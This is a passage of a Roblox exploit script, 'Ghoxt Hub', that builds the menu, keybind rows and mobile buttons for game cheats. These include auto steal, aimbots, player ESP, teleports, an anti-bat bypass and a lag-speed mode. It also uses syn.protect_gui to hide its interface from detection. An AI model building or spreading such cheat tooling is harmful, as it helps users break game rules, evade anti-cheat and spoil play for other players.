        local setter = mkToggle("Bat Counter", function(s)
            batCounterEnabled = s
            if s then startBatCounter() else stopBatCounter() end
            saveNow()
        end)
        setBatCounterVisual = setter
        setter(on)
    end

    setAutoStealVisual = mkToggle("Auto Steal", function(on)
        Steal.AutoStealEnabled = on
        if on then
            startAutoSteal()
            if _G.updateAutoStealUI then _G.updateAutoStealUI() end
        else
            stopAutoSteal()
            if _G.updateAutoStealUI then _G.updateAutoStealUI() end
        end
        saveNow()
    end)
    if setAutoStealVisual then setAutoStealVisual(Steal.AutoStealEnabled) end

    do
        local on = antiDieEnabled
        local setter = mkToggle("Anti Reset", function(s)
            antiDieEnabled = s
            if s then startAntiDie() else stopAntiDie() end
            saveNow()
        end)
        antiDieToggleVisual = setter
        setter(on)
    end

    do
        local on = meleeAimbotEnabled
        local setter = mkToggle("Mele Aimbot", function(s)
            toggleMeleeAimbot(s)
        end)
        meleeToggleVisual = setter
        setter(on)
    end

    do
        local on = autoTPDownEnabled
        local setter = mkToggle("Auto TP Down", function(s)
            autoTPDownEnabled = s
            if s then startAutoTPDown() else stopAutoTPDown() end
            if setAutoTPDownVisual then setAutoTPDownVisual(s) end
            saveNow()
        end)
        setAutoTPDownVisual = setter
        setter(on)
    end

    do
        local on = jumpEnabled
        local setter = mkToggle("Infinity Jump", function(s)
            jumpEnabled = s
            if s then startJumpMode() else stopJumpMode() end
            saveNow()
        end)
        setJumpVisual = setter
        setter(on)
    end

    do
        local row = Instance.new("Frame", activePage)
        row.Size = UDim2.new(1, -2, 0, 30)
        row.BackgroundTransparency = 1
        row.LayoutOrder = #activePage:GetChildren() + 1
        local lbl = Instance.new("TextLabel", row)
        lbl.Size = UDim2.new(0.5, 0, 1, 0)
        lbl.Position = UDim2.new(0, 11, 0, 0)
        lbl.BackgroundTransparency = 1
        lbl.Text = "Jump Mode"
        lbl.TextColor3 = Color3.fromRGB(255,255,255)
        lbl.Font = Enum.Font.GothamBold
        lbl.TextSize = 11
        lbl.TextXAlignment = Enum.TextXAlignment.Left
        local sel = mkSelector(row, jumpMode == 1 and "Tap Tap" or "Hold", function(btn)
            local newMode = jumpMode == 1 and 2 or 1
            jumpMode = newMode
            btn.Text = jumpMode == 1 and "Tap Tap" or "Hold"
            if jumpEnabled then
                stopJumpMode()
                startJumpMode()
            end
            saveNow()
        end)
        modeSelectBtn = sel
    end

    do
        local on = unwalkEnabled
        local setter = mkToggle("Unwalk", function(s)
            unwalkEnabled = s
            if s then startUnwalk() else stopUnwalk() end
            if _G.duelUnwalkSetter then _G.duelUnwalkSetter(s) end
            saveNow()
        end)
        _G.duelUnwalkSetter = setter
        setUnwalkVisual = setter
        setter(on)
    end

    do
        local on = antiLagEnabled
        local setter = mkToggle("Anti Lag", function(s)
            antiLagEnabled = s
            if s then enableAntiLag() else disableAntiLag() end
            if _G.antiLagToggleSetter then _G.antiLagToggleSetter(s) end
            saveNow()
        end)
        setAntiLagVisual = setter
        setter(on)
    end

    local spacerDuel = Instance.new("Frame", activePage)
    spacerDuel.Size = UDim2.new(1, 0, 0, 120)
    spacerDuel.BackgroundTransparency = 1
    spacerDuel.LayoutOrder = 100
    spacerDuel.Visible = true

    switchTab("Other")
    mkSect("Teleport")
    setInstaResetVisual = mkToggle("Insta Reset", function(on)
        if on then
            insta_reset()
            if instaResetFloatingButton and instaResetFloatingButton:FindFirstChild("Frame") then
                local btnFrame = instaResetFloatingButton:FindFirstChild("Frame")
                local label = btnFrame and btnFrame:FindFirstChild("TextLabel")
                if btnFrame then
                    btnFrame.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
                    if label then label.TextColor3 = Color3.fromRGB(100, 180, 255) end
                    task.delay(0.1, function()
                        if btnFrame then
                            btnFrame.BackgroundColor3 = Color3.fromRGB(0, 20, 80)
                            if label then label.TextColor3 = Color3.fromRGB(0, 0, 0) end
                        end
                    end)
                end
            end
            task.delay(0.3, function() if setInstaResetVisual then setInstaResetVisual(false) end end)
        end
    end)

    mkSect("Visual")
    local stretchToggleSetter
    stretchToggleSetter = mkToggle("Stretch", function(on)
        if on then
            enableStretch()
        else
            disableStretch()
        end
        stretchEnabled = on
        pcall(saveAllSettings)
    end)
    _G.stretchToggleSetter = stretchToggleSetter
    stretchToggleSetter(stretchEnabled)

    do
        local row = Instance.new("Frame", activePage)
        row.Size = UDim2.new(1, -2, 0, 30)
        row.BackgroundTransparency = 1
        row.LayoutOrder = #activePage:GetChildren() + 1
        local lbl = Instance.new("TextLabel", row)
        lbl.Size = UDim2.new(0.4, 0, 1, 0)
        lbl.Position = UDim2.new(0, 11, 0, 0)
        lbl.BackgroundTransparency = 1
        lbl.Text = "FOV"
        lbl.TextColor3 = Color3.fromRGB(255,255,255)
        lbl.Font = Enum.Font.GothamBold
        lbl.TextSize = 11
        lbl.TextXAlignment = Enum.TextXAlignment.Left
        local btnFrame = Instance.new("Frame", row)
        btnFrame.Size = UDim2.new(0, 150, 0, 28)
        btnFrame.Position = UDim2.new(1, -162, 0.5, -14)
        btnFrame.BackgroundTransparency = 1
        local fovBtns = {}
        local function makeFOVBtn(val, x)
            local btn = Instance.new("TextButton", btnFrame)
            btn.Size = UDim2.new(0, 44, 0, 28)
            btn.Position = UDim2.new(0, x, 0, 0)
            btn.BackgroundColor3 = Color3.fromRGB(12,12,12)
            btn.BorderSizePixel = 0
            btn.Text = tostring(val)
            btn.TextColor3 = Color3.fromRGB(255,255,255)
            btn.Font = Enum.Font.GothamBold
            btn.TextSize = 12
            Instance.new("UICorner", btn).CornerRadius = UDim.new(0, 5)
            local stroke = Instance.new("UIStroke", btn)
            stroke.Color = Color3.fromRGB(80,80,80)
            stroke.Thickness = 1
            if val == stretchFOV then
                btn.BackgroundColor3 = Color3.fromRGB(255,255,255)
                btn.TextColor3 = Color3.fromRGB(0,0,0)
            end
            btn.MouseButton1Click:Connect(function()
                stretchFOV = val
                if stretchEnabled then
                    applyStretchFOV(val)
                end
                for _, b in ipairs(btnFrame:GetChildren()) do
                    if b:IsA("TextButton") then
                        local v = tonumber(b.Text)
                        if v == val then
                            b.BackgroundColor3 = Color3.fromRGB(255,255,255)
                            b.TextColor3 = Color3.fromRGB(0,0,0)
                        else
                            b.BackgroundColor3 = Color3.fromRGB(12,12,12)
                            b.TextColor3 = Color3.fromRGB(255,255,255)
                        end
                    end
                end
                pcall(saveAllSettings)
            end)
            table.insert(fovBtns, btn)
            return btn
        end
        makeFOVBtn(80, 0)
        makeFOVBtn(110, 53)
        makeFOVBtn(130, 106)
        _G.fovButtons = fovBtns
    end

    local setGalaxySkyVisual
    do
        local on = galaxySkyEnabled
        local setter = mkToggle("Galaxy Sky", function(s) toggleGalaxySky(s) end)
        setGalaxySkyVisual = setter
        setter(on)
    end

    do
        local on = antiBatSpinEnabled
        local setter = mkToggle("Anti Bat Spin", function(s)
            antiBatSpinEnabled = s
            if s then startAntiBatSpin() else stopAntiBatSpin() end
            saveNow()
        end)
        antiBatSpinVisual = setter
        setter(on)
    end

    do
        local on = ragdollTimerEnabled
        local setter = mkToggle("Ragdoll Timer", function(s)
            ragdollTimerEnabled = s
            if s then startRagdollTimer() else stopRagdollTimer() end
            saveNow()
        end)
        setRagdollTimerVisual = setter
        setter(on)
    end

    espToggleVisual = mkToggle("Player ESP", function(on)
        toggleESP(on)
    end)
    espToggleVisual(espEnabled)

    switchTab("Config")
    mkSect("Interface")
    setLockUIVisual = mkToggle("Lock UI", function(on)
        toggleLockUI(on)
    end)

    mkSect("Config")
    do
        local row = Instance.new("Frame", activePage)
        row.Size = UDim2.new(1, -16, 0, 34)
        row.BackgroundTransparency = 1
        row.LayoutOrder = #activePage:GetChildren() + 1
        local resetBtn = Instance.new("TextButton", row)
        resetBtn.Size = UDim2.new(0.9, 0, 0.8, 0)
        resetBtn.Position = UDim2.new(0.05, 0, 0.1, 0)
        resetBtn.BackgroundColor3 = Color3.fromRGB(0, 20, 80)
        resetBtn.BorderSizePixel = 0
        resetBtn.Text = "RESET POSITIONS"
        resetBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
        resetBtn.Font = Enum.Font.GothamBold
        resetBtn.TextSize = 13
        Instance.new("UICorner", resetBtn).CornerRadius = UDim.new(0, 6)
        local resetStroke = Instance.new("UIStroke", resetBtn)
        resetStroke.Color = Color3.fromRGB(150,150,150)
        resetStroke.Thickness = 1.2
        applyShimmerToText(resetBtn, 0.6)
        resetBtn.Activated:Connect(function()
            resetFloatingPositions()
            resetBtn.Text = "RESET ✓"
            resetBtn.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
            resetBtn.TextColor3 = Color3.fromRGB(100, 180, 255)
            task.delay(1.2, function()
                if resetBtn and resetBtn.Parent then
                    resetBtn.Text = "RESET POSITIONS"
                    resetBtn.BackgroundColor3 = Color3.fromRGB(0, 20, 80)
                    resetBtn.TextColor3 = Color3.fromRGB(255,255,255)
                end
            end)
        end)
    end

    do
        local row = Instance.new("Frame", activePage)
        row.Size = UDim2.new(1, -16, 0, 44)
        row.BackgroundTransparency = 1
        row.LayoutOrder = #activePage:GetChildren() + 1
        local delBtn = Instance.new("TextButton", row)
        delBtn.Size = UDim2.new(0.9, 0, 0.8, 0)
        delBtn.Position = UDim2.new(0.05, 0, 0.1, 0)
        delBtn.BackgroundColor3 = Color3.fromRGB(0, 20, 80)
        delBtn.BorderSizePixel = 0
        delBtn.Text = "RESET SETTINGS"
        delBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
        delBtn.Font = Enum.Font.GothamBold
        delBtn.TextSize = 14
        Instance.new("UICorner", delBtn).CornerRadius = UDim.new(0, 6)
        local delStroke = Instance.new("UIStroke", delBtn)
        delStroke.Color = Color3.fromRGB(192,192,192)
        delStroke.Thickness = 1.2
        applyShimmerToText(delBtn, 0.6)

        local deleteState=0
        local originalDeleteText="RESET SETTINGS"
        delBtn.Activated:Connect(function()
            if deleteState==0 then
                deleteState=1
                delBtn.Text="CONFIRM?"
                delBtn.BackgroundColor3=Color3.fromRGB(0, 40, 120)
                delBtn.TextColor3=Color3.fromRGB(255,255,255)
                task.delay(2,function()
                    if delBtn and delBtn.Parent and deleteState==1 then
                        deleteState=0
                        delBtn.Text=originalDeleteText
                        delBtn.BackgroundColor3=Color3.fromRGB(0, 20, 80)
                        delBtn.TextColor3=Color3.fromRGB(255,255,255)
                    end
                end)
            elseif deleteState==1 then
                local success=deleteAllSettings()
                if success then
                    delBtn.Text="RESET ✓"
                    delBtn.BackgroundColor3=Color3.fromRGB(0, 0, 0)
                    delBtn.TextColor3=Color3.fromRGB(100, 180, 255)
                    task.delay(1.5,function()
                        if delBtn and delBtn.Parent then
                            deleteState=0
                            delBtn.Text=originalDeleteText
                            delBtn.BackgroundColor3=Color3.fromRGB(0, 20, 80)
                            delBtn.TextColor3=Color3.fromRGB(255,255,255)
                        end
                    end)
                else
                    delBtn.Text="NO SETTINGS"
                    delBtn.BackgroundColor3=Color3.fromRGB(60,60,60)
                    delBtn.TextColor3=Color3.fromRGB(255,255,255)
                    task.delay(1.2,function()
                        if delBtn and delBtn.Parent then
                            deleteState=0
                            delBtn.Text=originalDeleteText
                            delBtn.BackgroundColor3=Color3.fromRGB(0, 20, 80)
                            delBtn.TextColor3=Color3.fromRGB(255,255,255)
                        end
                    end)
                end
            end
        end)
    end

    switchTab("Keybinds")
    mkSect("Keybinds")
    local keyButtonRefs = {}

    local function mkRowDark(h)
        local f = Instance.new("Frame", activePage)
        f.Size = UDim2.new(1, -2, 0, h or 30)
        f.BackgroundTransparency = 1
        f.BorderSizePixel = 0
        f.LayoutOrder = #activePage:GetChildren() + 1
        return f
    end

    local function mkKeyButtonDark(parent, kbEntry)
        local btn = Instance.new("TextButton", parent)
        btn.Size = UDim2.new(0, 85, 0, 26)
        btn.Position = UDim2.new(1, -93, 0.5, -13)
        btn.BackgroundColor3 = Color3.fromRGB(20, 20, 50)
        btn.BorderSizePixel = 0
        local function getLabel() return (kbEntry.gp and kbEntry.gp.Name) or (kbEntry.kb and kbEntry.kb.Name) or "None" end
        btn.Text = getLabel()
        btn.TextColor3 = Color3.fromRGB(255, 255, 255)
        btn.Font = Enum.Font.GothamBold
        btn.TextSize = 10
        btn.ZIndex = 5
        Instance.new("UICorner", btn).CornerRadius = UDim.new(0, 5)
        local bs = Instance.new("UIStroke", btn)
        bs.Color = Color3.fromRGB(255, 255, 255)
        bs.Thickness = 1
        bs.Transparency = 0.2
        local li = false; local lc; local pv = btn.Text; local listenStart = 0
        btn.Activated:Connect(function()
            if li then li=false; _anyKeyListening=false; if lc then lc:Disconnect(); lc=nil end; btn.Text=pv; btn.TextColor3=Color3.fromRGB(255,255,255); return end
            pv = btn.Text; li = true; _anyKeyListening = true; listenStart = tick(); btn.Text = "..."; btn.TextColor3 = Color3.fromRGB(255,255,255)
            lc = UIS.InputBegan:Connect(function(inp)
                if not li then return end
                if inp.KeyCode == Enum.KeyCode.Escape then li=false; _anyKeyListening=false; if lc then lc:Disconnect(); lc=nil end; btn.Text=pv; btn.TextColor3=Color3.fromRGB(255,255,255); return end
                local isGp = isGamepadInput(inp)
                if isGp and tick()-listenStart < 0.15 then return end
                if not isBindableInput(inp) then return end
                btn.Text = inp.KeyCode.Name; pv = inp.KeyCode.Name; btn.TextColor3 = Color3.fromRGB(255,255,255)
                li = false; _anyKeyListening = false; if lc then lc:Disconnect(); lc=nil end
                if isGp then kbEntry.gp = inp.KeyCode; kbEntry.kb = nil else kbEntry.kb = inp.KeyCode; kbEntry.gp = nil end
                saveNow()
            end)
        end)
        return btn
    end

    local function addKeybindRowDark(labelText, kbEntry)
        local row = mkRowDark(30)
        local lbl = Instance.new("TextLabel", row)
        lbl.Size = UDim2.new(0.5, 0, 1, 0)
        lbl.Position = UDim2.new(0, 11, 0, 0)
        lbl.BackgroundTransparency = 1
        lbl.Text = labelText
        lbl.TextColor3 = Color3.fromRGB(255,255,255)
        lbl.Font = Enum.Font.GothamBold
        lbl.TextSize = 11
        lbl.TextXAlignment = Enum.TextXAlignment.Left
        local btn = mkKeyButtonDark(row, kbEntry)
        table.insert(keyButtonRefs, {btn=btn, entry=kbEntry})
    end

    addKeybindRowDark("Carry Mode", KB.CarryToggle)
    addKeybindRowDark("Lagger Mode", KB.LaggerMode)
    addKeybindRowDark("Auto Left", KB.AutoLeft)
    addKeybindRowDark("Auto Right", KB.AutoRight)
    addKeybindRowDark("Auto Bat", KB.AutoBat)
    addKeybindRowDark("Bypass-Anti Bat", KB.Bypass)
    addKeybindRowDark("TP Bat", KB.TPBat)
    addKeybindRowDark("TP Down", KB.TPFloor)
    addKeybindRowDark("Drop Brainrot", KB.DropBrainrot)
    addKeybindRowDark("Insta Reset", KB.InstaReset)

    local spacer = Instance.new("Frame", activePage)
    spacer.Size = UDim2.new(1, 0, 0, 20)
    spacer.BackgroundTransparency = 1
    spacer.LayoutOrder = 100
    spacer.Visible = true

    _G.keyButtonRefs = keyButtonRefs

    switchTab("Speed")

    local function drag(f)
        local dn,ds,sp,di=false
        f.InputBegan:Connect(function(i)
            if uiLocked then return end
            if i.UserInputType==Enum.UserInputType.MouseButton1 or i.UserInputType==Enum.UserInputType.Touch then
                dn=true; ds=i.Position; sp=f.Position
                i.Changed:Connect(function() if i.UserInputState==Enum.UserInputState.End then dn=false end end)
            end
        end)
        f.InputChanged:Connect(function(i)
            if i.UserInputType==Enum.UserInputType.MouseMovement or i.UserInputType==Enum.UserInputType.Touch then di=i end
        end)
        UIS.InputChanged:Connect(function(i)
            if i==di and dn then
                if uiLocked then dn=false; return end
                local nX=sp.X.Offset+(i.Position.X-ds.X)
                local nY=sp.Y.Offset+(i.Position.Y-ds.Y)
                f.Position=UDim2.new(sp.X.Scale,nX,sp.Y.Scale,nY)
            end
        end)
    end
    drag(main)

    miniBtn=Instance.new("TextButton",gui)
    miniBtn.Size=UDim2.new(0,160,0,36)
    miniBtn.Position=UDim2.new(0,38,0,60)
    miniBtn.BackgroundColor3=Color3.fromRGB(80,0,0)
    miniBtn.BorderSizePixel=0
    miniBtn.Text=""
    miniBtn.ZIndex=20
    miniBtn.Visible=false
    Instance.new("UICorner",miniBtn).CornerRadius=UDim.new(0,18)
    local miniStroke=Instance.new("UIStroke",miniBtn)
    miniStroke.Color=Color3.fromRGB(0,0,0)
    miniStroke.Thickness=1
    miniStroke.Transparency=0.8
    local miniMainText=Instance.new("TextLabel",miniBtn)
    miniMainText.Size=UDim2.new(1,-38,1,0)
    miniMainText.Position=UDim2.new(0,32,0,0)
    miniMainText.BackgroundTransparency=1
    miniMainText.Text="Ghoxt Hub"
    miniMainText.TextColor3=Color3.fromRGB(0,0,0)
    miniMainText.Font=Enum.Font.GothamBlack
    miniMainText.TextSize=14
    miniMainText.TextXAlignment=Enum.TextXAlignment.Left
    miniMainText.ZIndex=21
    drag(miniBtn)

    -- Evento de apertura con animación fade-in
    miniBtn.MouseButton1Click:Connect(function()
        main.Visible = true
        miniBtn.Visible = false
        fadeOverlay.BackgroundTransparency = 0
        TS:Create(fadeOverlay, TweenInfo.new(0.3, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {BackgroundTransparency = 1}):Play()
        setActivePage("Speed")
    end)

    main.Visible=true
    miniBtn.Visible=false
    setActivePage("Speed")
end

-- ====== CREACIÓN DE BOTONES FLOTANTES MÓVILES ======
local function createMobileFloatingButtons()
    local panel = Instance.new("ScreenGui")
    panel.Name = "GhoxtMobileFloating"
    panel.ResetOnSpawn = false
    panel.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
    panel.DisplayOrder = 15
    pcall(function() if syn and syn.protect_gui then syn.protect_gui(panel) end end)
    if not pcall(function() panel.Parent = game:GetService("CoreGui") end) then
        panel.Parent = LP:WaitForChild("PlayerGui")
    end

    local INACTIVE_BG = Color3.fromRGB(140, 0, 0)
    local ACTIVE_BG = Color3.fromRGB(255, 255, 255)
    local INACTIVE_TEXT = Color3.fromRGB(0, 0, 0)
    local ACTIVE_TEXT = Color3.fromRGB(100, 180, 255)

    local buttonDefs = {
        {name = "AutoRight", label = "AUTO\nRIGHT", order = 0, isToggle = true},
        {name = "AutoLeft",  label = "AUTO\nLEFT",  order = 1, isToggle = true},
        {name = "AutoBat",   label = "BAT\nAIMBOT", order = 2, isToggle = true},
        {name = "DropBR",    label = "DROP\nBR",    order = 3, isToggle = false},
        {name = "TpDown",    label = "TP\nDOWN",    order = 4, isToggle = false},
        {name = "Carry",     label = "CARRY\nSPD",  order = 5, isToggle = true},
        {name = "Lagger",    label = "LAGGER\nSPD", order = 6, isToggle = true},
    }

    local function makeButtonFrame(def)
        local col = def.order % MOBILE_COLS
        local row = math.floor(def.order / MOBILE_COLS)
        local xOff = - (MOBILE_BTN_W * MOBILE_COLS + MOBILE_GAP * (MOBILE_COLS-1)) - 10 + col * (MOBILE_BTN_W + MOBILE_GAP)
        local yOff = row * (MOBILE_BTN_H + MOBILE_GAP + MOBILE_ROW_GAP)

        local saved = mobileButtonPositions[def.name]
        local frame = Instance.new("Frame", panel)
        frame.Size = UDim2.new(0, MOBILE_BTN_W, 0, MOBILE_BTN_H)
        if saved then
            frame.Position = UDim2.new(saved.XScale or 1, saved.XOffset or xOff,
                                       saved.YScale or 0, saved.YOffset or yOff)
        else
            frame.Position = UDim2.new(1, xOff, 0, yOff)
        end
        frame.BackgroundColor3 = INACTIVE_BG
        frame.BackgroundTransparency = 0
        frame.BorderSizePixel = 0
        frame.ZIndex = 20
        local corner = Instance.new("UICorner", frame)
        corner.CornerRadius = UDim.new(0, MOBILE_CORNER_RADIUS)

        applyShimmerStroke(frame, 1.8)

        local label = Instance.new("TextLabel", frame)
        label.Size = UDim2.new(1, 0, 1, 0)
        label.BackgroundTransparency = 1
        label.Text = def.label
        label.TextColor3 = INACTIVE_TEXT
        label.Font = Enum.Font.GothamBold
        label.TextSize = 9
        label.TextWrapped = true
        label.ZIndex = 21

        local labelStroke = Instance.new("UIStroke", label)
        labelStroke.Color = Color3.fromRGB(200, 200, 200)
        labelStroke.Thickness = 0.8
        labelStroke.Transparency = 0.4

        applyShimmerToText(label, 0.7)

        local active = false
        local function setActive(state)
            active = state
            if active then
                frame.BackgroundColor3 = ACTIVE_BG
                label.TextColor3 = ACTIVE_TEXT
                labelStroke.Transparency = 0
            else
                frame.BackgroundColor3 = INACTIVE_BG
                label.TextColor3 = INACTIVE_TEXT
                labelStroke.Transparency = 0.4
            end
        end

        local dragging = false
        local hasMoved = false
        local dragStart = nil
        local startPos = nil
        local dragThreshold = 5

        local function onInputBegan(input)
            if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
                dragging = true
                hasMoved = false
                dragStart = input.Position
                startPos = frame.Position
            end
        end

        local function onInputChanged(input)
            if not dragging then return end
            if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
                local delta = input.Position - dragStart
                if math.abs(delta.X) > dragThreshold or math.abs(delta.Y) > dragThreshold then
                    hasMoved = true
                end
                if hasMoved and not uiLocked then
                    frame.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X,
                                               startPos.Y.Scale, startPos.Y.Offset + delta.Y)
                end
            end
        end

        local function onInputEnded(input)
            if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
                if dragging then
                    if not hasMoved then
                        if def.name == "DropBR" then
                            if not dropActive then
                                setActive(true)
                                executeDropWithToggle(function(v)
                                    if dropBrainrotSetVisual then dropBrainrotSetVisual(v) end
                                    setActive(v)
                                end)
                                task.delay(0.3, function() setActive(false) end)
                            end
                        elseif def.name == "AutoLeft" then
                            autoLeftEnabled = not autoLeftEnabled
                            setActive(autoLeftEnabled)
                            if autoLeftEnabled then startAutoLeft() else stopAutoLeft() end
                            if autoLeftSetVisual then autoLeftSetVisual(autoLeftEnabled) end
                            saveNow()
                        elseif def.name == "AutoBat" then
                            if not autoBatEnabled then enableAutoBat() else disableAutoBat() end
                            setActive(autoBatEnabled)
                            saveNow()
                        elseif def.name == "AutoRight" then
                            autoRightEnabled = not autoRightEnabled
                            setActive(autoRightEnabled)
                            if autoRightEnabled then startAutoRight() else stopAutoRight() end
                            if autoRightSetVisual then autoRightSetVisual(autoRightEnabled) end
                            saveNow()
                        elseif def.name == "TpDown" then
                            setActive(true)
                            executeTPDown()
                            task.delay(0.2, function() setActive(false) end)
                        elseif def.name == "Carry" then
                            if not speedMode then
                                speedMode = true; laggerToggled = false; laggerLevel = 1; setActive(true)
                                if mobSetLagger then mobSetLagger(false) end
                            else
                                speedMode = false; setActive(false)
                            end
                            refreshSpeedModeLabel()
                            saveNow()
                        elseif def.name == "Lagger" then
                            if speedMode then speedMode=false; if mobSetCarry then mobSetCarry(false) end end
                            toggleLaggerCycle()
                        end
                    else
                        mobileButtonPositions[def.name] = {
                            XScale = frame.Position.X.Scale,
                            XOffset = frame.Position.X.Offset,
                            YScale = frame.Position.Y.Scale,
                            YOffset = frame.Position.Y.Offset
                        }
                        pcall(saveAllSettings)
                    end
                    dragging = false
                    hasMoved = false
                    dragStart = nil
                    startPos = nil
                end
            end
        end

        frame.InputBegan:Connect(onInputBegan)
        frame.InputChanged:Connect(onInputChanged)
        frame.InputEnded:Connect(onInputEnded)

        return frame, setActive
    end

    for _, def in ipairs(buttonDefs) do
        local frame, setActive = makeButtonFrame(def)
        mobileButtonFrames[def.name] = frame
        mobileButtonSetters[def.name] = setActive

        if def.name == "AutoBat" then
            frame.Visible = false
        end

        if def.name == "DropBR" then mobSetDropBR = setActive end
        if def.name == "AutoLeft" then mobSetAutoLeft = setActive end
        if def.name == "AutoBat" then mobSetAutoBat = setActive end
        if def.name == "AutoRight" then mobSetAutoRight = setActive end
        if def.name == "TpDown" then mobSetTpDown = setActive end
        if def.name == "Carry" then mobSetCarry = setActive end
        if def.name == "Lagger" then mobSetLagger = setActive end
    end

    do
        local def = {name = "BatTP", label = "TP\nBAT", order = 7, isToggle = true}
        local xOff = getLeftOfDropBR()
        local yOff = MOBILE_BTN_H + MOBILE_GAP

        local saved = mobileButtonPositions[def.name]
        local frame = Instance.new("Frame", panel)
        frame.Size = UDim2.new(0, MOBILE_BTN_W, 0, MOBILE_BTN_H)
        if saved then
            frame.Position = UDim2.new(saved.XScale or 1, saved.XOffset or xOff,
                                       saved.YScale or 0, saved.YOffset or yOff)
        else
            frame.Position = UDim2.new(1, xOff, 0, yOff)
        end
        frame.BackgroundColor3 = INACTIVE_BG
        frame.BackgroundTransparency = 0
        frame.BorderSizePixel = 0
        frame.ZIndex = 20
        local corner = Instance.new("UICorner", frame)
        corner.CornerRadius = UDim.new(0, MOBILE_CORNER_RADIUS)

        applyShimmerStroke(frame, 1.8)

        local label = Instance.new("TextLabel", frame)
        label.Size = UDim2.new(1, 0, 1, 0)
        label.BackgroundTransparency = 1
        label.Text = def.label
        label.TextColor3 = INACTIVE_TEXT
        label.Font = Enum.Font.GothamBold
        label.TextSize = 9
        label.TextWrapped = true
        label.ZIndex = 21

        local labelStroke = Instance.new("UIStroke", label)
        labelStroke.Color = Color3.fromRGB(200, 200, 200)
        labelStroke.Thickness = 0.8
        labelStroke.Transparency = 0.4

        applyShimmerToText(label, 0.7)

        local active = false
        local function setActive(state)
            active = state
            if active then
                frame.BackgroundColor3 = ACTIVE_BG
                label.TextColor3 = ACTIVE_TEXT
                labelStroke.Transparency = 0
            else
                frame.BackgroundColor3 = INACTIVE_BG
                label.TextColor3 = INACTIVE_TEXT
                labelStroke.Transparency = 0.4
            end
        end
        mobSetBatTP = setActive

        local dragging = false
        local hasMoved = false
        local dragStart = nil
        local startPos = nil
        local dragThreshold = 5

        local function onInputBegan(input)
            if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
                dragging = true
                hasMoved = false
                dragStart = input.Position
                startPos = frame.Position
            end
        end

        local function onInputChanged(input)
            if not dragging then return end
            if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
                local delta = input.Position - dragStart
                if math.abs(delta.X) > dragThreshold or math.abs(delta.Y) > dragThreshold then
                    hasMoved = true
                end
                if hasMoved and not uiLocked then
                    frame.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X,
                                               startPos.Y.Scale, startPos.Y.Offset + delta.Y)
                end
            end
        end

        local function onInputEnded(input)
            if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
                if dragging then
                    if not hasMoved then
                        if bypassToggled and bypassMode == 2 then
                            toggleTPBat(false)
                        else
                            toggleTPBat(true)
                        end
                        setActive(bypassToggled and bypassMode == 2)
                        if tpBatSetVisual then tpBatSetVisual(bypassToggled and bypassMode == 2) end
                        if bypassSetVisual then bypassSetVisual(bypassToggled and bypassMode == 1) end
                    else
                        mobileButtonPositions[def.name] = {
                            XScale = frame.Position.X.Scale,
                            XOffset = frame.Position.X.Offset,
                            YScale = frame.Position.Y.Scale,
                            YOffset = frame.Position.Y.Offset
                        }
                        pcall(saveAllSettings)
                    end
                    dragging = false
                    hasMoved = false
                    dragStart = nil
                    startPos = nil
                end
            end
        end

        frame.InputBegan:Connect(onInputBegan)
        frame.InputChanged:Connect(onInputChanged)
        frame.InputEnded:Connect(onInputEnded)

        mobileButtonFrames[def.name] = frame
        mobileButtonSetters[def.name] = setActive
    end

    if mobSetAutoBat then mobSetAutoBat(autoBatEnabled) end
    if mobSetAutoLeft then mobSetAutoLeft(autoLeftEnabled) end
    if mobSetAutoRight then mobSetAutoRight(autoRightEnabled) end
    if mobSetCarry then mobSetCarry(speedMode) end
    if mobSetLagger then mobSetLagger(laggerToggled) end
    if mobSetBatTP then mobSetBatTP(bypassToggled and bypassMode == 2) end

    return panel
end

-- ====== BOTÓN FLOTANTE DE INSTA RESET ======
local function createInstaResetFloatingButton()
    local panel = Instance.new("ScreenGui")
    panel.Name = "InstaResetButton"
    panel.ResetOnSpawn = false
    panel.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
    panel.DisplayOrder = 20
    pcall(function() if syn and syn.protect_gui then syn.protect_gui(panel) end end)
    if not pcall(function() panel.Parent = game:GetService("CoreGui") end) then
        panel.Parent = LP:WaitForChild("PlayerGui")
    end

    local btnFrame = Instance.new("Frame", panel)
    btnFrame.Size = UDim2.new(0, MOBILE_BTN_W, 0, MOBILE_BTN_H)
    btnFrame.Name = "Frame"
    local defaultX = getLeftOfDropBR()
    if instaResetFloatingPos then
        btnFrame.Position = UDim2.new(instaResetFloatingPos.XScale or 1,
                                      instaResetFloatingPos.XOffset or defaultX,
                                      instaResetFloatingPos.YScale or 0,
                                      instaResetFloatingPos.YOffset or 0)
    else
        btnFrame.Position = UDim2.new(1, defaultX, 0, 0)
    end
    btnFrame.BackgroundColor3 = Color3.fromRGB(140, 0, 0)
    btnFrame.BackgroundTransparency = 0
    btnFrame.BorderSizePixel = 0
    btnFrame.ZIndex = 20
    local corner = Instance.new("UICorner", btnFrame)
    corner.CornerRadius = UDim.new(0, MOBILE_CORNER_RADIUS)

    applyShimmerStroke(btnFrame, 1.8)

    local label = Instance.new("TextLabel", btnFrame)
    label.Size = UDim2.new(1, 0, 1, 0)
    label.BackgroundTransparency = 1
    label.Text = "RESET"
    label.TextColor3 = Color3.fromRGB(0, 0, 0)
    label.Font = Enum.Font.GothamBold
    label.TextSize = 11
    label.TextWrapped = true
    label.ZIndex = 21

    local labelStroke = Instance.new("UIStroke", label)
    labelStroke.Color = Color3.fromRGB(200, 200, 200)
    labelStroke.Thickness = 0.8
    labelStroke.Transparency = 0.4

    applyShimmerToText(label, 0.9)

    local function setActive(state)
        if state then
            btnFrame.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
